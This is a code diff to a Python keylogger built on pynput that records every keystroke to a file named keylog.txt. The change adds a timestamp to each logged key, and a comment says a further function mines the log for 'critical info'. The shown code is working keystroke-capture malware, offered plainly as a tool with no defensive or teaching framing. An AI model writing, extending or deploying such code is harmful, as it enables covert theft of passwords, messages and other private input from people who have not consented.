@@ -1,9 +1,12 @@
 import pynput.keyboard
+import datetime
 import re
 import logging
 import subprocess
 import os
 
+# Setting up date time
+time = datetime.datetime.now()
 # Set up logging for storing keystrokes
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")
 
@@ -11,10 +14,10 @@ logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(messag
 def on_press(key):
     try:
         # Log the key pressed (character keys like a, b, 1, etc.)
-        logging.info(f"{key.char}")
+        logging.info(f"{key.char} {time}")
     except AttributeError:
         # Handle special keys like space, enter, etc.
-        logging.info(f"{key}")
+        logging.info(f"{key} {time}")
 
 # Define a function to process keylog data and use NLP to extract critical info
 def process_log():
